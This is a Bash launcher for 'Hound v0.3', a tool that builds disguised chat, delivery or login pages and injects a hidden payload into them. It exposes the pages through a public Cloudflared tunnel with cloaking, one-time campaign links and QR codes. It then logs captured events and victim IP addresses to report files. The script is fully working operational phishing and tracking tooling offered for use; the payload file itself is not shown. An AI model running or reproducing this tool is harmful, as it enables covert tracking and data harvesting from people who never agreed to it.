#!/bin/bash
# Hound v 0.3 - Smart Edition

trap 'printf "\n"; stop' 2

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
FORMATTER="${SCRIPT_DIR}/format_event.py"
export PYTHONIOENCODING="${PYTHONIOENCODING:-utf-8}"
WATCH_PID=""
PHP_PID=""
CF_PID=""
PYTHON_BIN=""
PUBLIC_BASE=""
CAMPAIGN_ID="default"
TEMPLATE_LABEL="chat"
SERVER_MODE="local"

if [[ -t 1 && -z "${NO_COLOR:-}" ]]; then
  RESET='\033[0m'
  BOLD='\033[1m'
  DIM='\033[2m'
  RED='\033[1;31m'
  GREEN='\033[1;32m'
  YELLOW='\033[1;33m'
  CYAN='\033[1;36m'
  GRAY='\033[90m'
  WHITE='\033[1;37m'
else
  RESET='' BOLD='' DIM='' RED='' GREEN='' YELLOW='' CYAN='' GRAY='' WHITE=''
fi

hr() {
  printf "${GRAY}  ------------------------------------------------------------------------${RESET}\n"
}

kv() {
  printf "  ${DIM}%-12s${RESET} %b\n" "$1" "$2"
}

section() {
  printf "\n  ${WHITE}%s${RESET}\n" "$1"
  hr
}

ok() {
  printf "  ${GREEN}[+]${RESET} %b\n" "$1"
}

info() {
  printf "  ${CYAN}[*]${RESET} %b\n" "$1"
}

warn() {
  printf "  ${YELLOW}[!]${RESET} %b\n" "$1"
}

err() {
  printf "  ${RED}[x]${RESET} %b\n" "$1"
}

prompt() {
  local answer=""
  printf "\n  ${YELLOW}%s${RESET}\n" "$1" >&2
  if [[ -n "${2:-}" ]]; then
    printf "  ${DIM}%s${RESET}\n" "$2" >&2
  fi
  printf "  ${BOLD}>${RESET} " >&2
  read -r answer
  printf "%s" "$answer"
}

banner() {
  clear
  printf "\n"
  printf "${CYAN}"
  printf '         ██   ██  ██████  ██    ██ ███    ██ ██████\n'
  printf '         ██   ██ ██    ██ ██    ██ ████   ██ ██   ██\n'
  printf '         ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██\n'
  printf '         ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██\n'
  printf '         ██   ██  ██████   ██████  ██   ████ ██████\n'
  printf "${RESET}\n"
  hr
  kv "Version" "${WHITE}0.3 Smart${RESET}"
  kv "Author"  "Anil Parashar  ${DIM}[TechChip]${RESET}"
  kv "Modules" "alerts | dashboard | cloaking | chat"
  printf "  ${DIM}%-12s${RESET} %s\n" "Hint" "Optional alerts (Telegram/Discord/Slack) go in config.json."
  printf "\n"
}

dependencies() {
  if ! command -v php >/dev/null 2>&1; then
    err "PHP is required but was not found."
    exit 1
  fi
  if command -v python3 >/dev/null 2>&1; then
    PYTHON_BIN="python3"
  elif command -v python >/dev/null 2>&1; then
    PYTHON_BIN="python"
  fi
  mkdir -p data/sessions
  if [[ ! -f config.json ]]; then
    warn "config.json missing. Using bundled defaults."
  fi
}

stop() {
  if [[ -n "${WATCH_PID:-}" ]]; then
    kill "${WATCH_PID}" >/dev/null 2>&1
    wait "${WATCH_PID}" 2>/dev/null
  fi
  if [[ -n "${CF_PID:-}" ]]; then
    kill "${CF_PID}" >/dev/null 2>&1
    wait "${CF_PID}" 2>/dev/null
  fi
  if [[ -n "${PHP_PID:-}" ]]; then
    kill "${PHP_PID}" >/dev/null 2>&1
    wait "${PHP_PID}" 2>/dev/null
  fi
  pkill -f -2 cloudflared >/dev/null 2>&1
  printf "\n"
  warn "Stopped. Processes cleaned up."
  printf "\n"
  exit 1
}

build_page() {
  local template_file="$1"
  sed -e '/tc_payload/r payload' "$template_file" | sed 's|\.\./||g' > index.html
}

generate_token_link() {
  local base_link="$1"
  local campaign="$2"
  if php -r '
$config=json_decode(file_get_contents("config.json"),true);
exit(empty($config["security"]["one_time_links"]) ? 1 : 0);
' 2>/dev/null; then
    token=$(php -r 'require "smart_engine.php"; echo hound_generate_token("'"$campaign"'");')
    printf "%s" "${base_link}?t=${token}&id=${campaign}"
  else
    printf "%s?id=${campaign}" "$base_link"
  fi
}

print_session_card() {
  local link="$1"
  section "Session"
  kv "Template"  "${WHITE}${TEMPLATE_LABEL}${RESET}"
  kv "Campaign"  "${WHITE}${CAMPAIGN_ID}${RESET}"
  kv "Mode"      "${WHITE}${SERVER_MODE}${RESET}"
  kv "Link"      "${CYAN}${link}${RESET}"
  kv "Dashboard" "${CYAN}${PUBLIC_BASE}/dashboard/index.html${RESET}"
}

print_qr() {
  local link="$1"
  local encoded="$link"
  if [[ -n "${PYTHON_BIN}" ]]; then
    encoded=$("${PYTHON_BIN}" -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$link" 2>/dev/null || echo "$link")
  fi
  kv "QR file" "${DIM}${PUBLIC_BASE}/api/qr.php?data=${encoded}${RESET}"
  if command -v qrencode >/dev/null 2>&1; then
    printf "\n"
    qrencode -t ANSIUTF8 "$link"
  fi
}

archive_ip() {
  if [[ -e ip.txt ]]; then
    cat ip.txt >> saved.ip.txt
    rm -f ip.txt
  fi
}

start_event_watch() {
  touch data.txt
  if [[ -n "${PYTHON_BIN}" && -f "$FORMATTER" ]]; then
    "${PYTHON_BIN}" "$FORMATTER" --follow data.txt &
    WATCH_PID=$!
    return
  fi
  if command -v jq >/dev/null 2>&1; then
    tail -n 0 -F data.txt 2>/dev/null | jq -C . &
    WATCH_PID=$!
    return
  fi
  warn "Python/format_event.py not found. Showing raw events."
  tail -n 0 -F data.txt 2>/dev/null &
  WATCH_PID=$!
}

checkfound() {
  section "Live events"
  kv "Status"    "${GREEN}listening${RESET}  ${DIM}Ctrl+C to stop${RESET}"
  kv "Dashboard" "${CYAN}${PUBLIC_BASE}/dashboard/index.html${RESET}"
  printf "  ${DIM}Noisy events (behavior) are hidden. Set HOUND_VERBOSE=1 to show them.${RESET}\n"
  printf "\n"

  start_event_watch

  while true; do
    archive_ip
    sleep 0.5
  done
}

ensure_cloudflared() {
  if [[ -e cloudflared ]]; then
    info "Cloudflared binary already present."
    return
  fi
  if ! command -v wget >/dev/null 2>&1; then
    err "wget is required to download Cloudflared."
    exit 1
  fi
  info "Downloading Cloudflared..."
  arch=$(uname -m)
  arch2=$(uname -a | grep -o 'Android' | head -n1)
  local url=""
  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
    url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
  elif [[ "$arch" == *'aarch64'* ]]; then
    url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
  elif [[ "$arch" == *'x86_64'* ]]; then
    url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
  else
    url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
  fi
  if ! wget --no-check-certificate "$url" -O cloudflared >/dev/null 2>&1 || [[ ! -s cloudflared ]]; then
    err "Failed to download Cloudflared."
    exit 1
  fi
  chmod +x cloudflared
}

cf_server() {
  SERVER_MODE="cloudflared"
  ensure_cloudflared
  chmod +x cloudflared

  section "Tunnel"
  info "Starting PHP on ${WHITE}127.0.0.1:3333${RESET}"
  php -S 127.0.0.1:3333 >/dev/null 2>&1 &
  PHP_PID=$!
  sleep 2

  info "Opening Cloudflared tunnel..."
  rm -f cf.log
  ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log >/dev/null 2>&1 &
  CF_PID=$!
  sleep 10

  link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
  if [[ -z "$link" ]]; then
    err "Cloudflared did not return a public URL. Check cf.log."
    stop
  fi

  PUBLIC_BASE="$link"
  final_link=$(generate_token_link "$link" "$CAMPAIGN_ID")
  ok "Tunnel is ready."
  print_session_card "$final_link"
  print_qr "$final_link"
  cp template.php index.php
  checkfound
}

local_server() {
  SERVER_MODE="localhost"
  PUBLIC_BASE="http://127.0.0.1:8080"
  cp template.php index.php
  final_link=$(generate_token_link "$PUBLIC_BASE" "$CAMPAIGN_ID")

  section "Server"
  info "Starting PHP on ${WHITE}127.0.0.1:8080${RESET}"
  php -S 127.0.0.1:8080 >/dev/null 2>&1 &
  PHP_PID=$!
  sleep 2
  ok "Local server is ready."
  print_session_card "$final_link"
  print_qr "$final_link"
  checkfound
}

hound() {
  if [[ -e data.txt ]]; then
    cat data.txt >> targetreport.txt
    rm -f data.txt
  fi
  touch data.txt
  rm -f ip.txt

  section "Setup"
  kv "Templates" "chat   delivery   login"
  kv "Default"   "chat"

  template_choice="$(prompt "Template" "Press Enter for chat.")"
  template_choice="${template_choice:-chat}"
  case "$template_choice" in
    delivery)
      template_file="templates/delivery.html"
      TEMPLATE_LABEL="delivery"
      ;;
    login)
      template_file="templates/login.html"
      TEMPLATE_LABEL="login"
      ;;
    *)
      template_file="index_chat.html"
      TEMPLATE_LABEL="chat"
      ;;
  esac
  build_page "$template_file"
  ok "Built ${WHITE}${TEMPLATE_LABEL}${RESET} page."

  campaign_input="$(prompt "Campaign ID" "Used for analytics. Press Enter for default.")"
  CAMPAIGN_ID="${campaign_input:-default}"
  ok "Campaign ${WHITE}${CAMPAIGN_ID}${RESET}"

  option_server="$(prompt "Use Cloudflared tunnel? [Y/n]" "n = localhost:8080 only.")"
  option_server="${option_server:-Y}"
  if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
    cf_server
  else
    local_server
  fi
}

banner
dependencies
hound
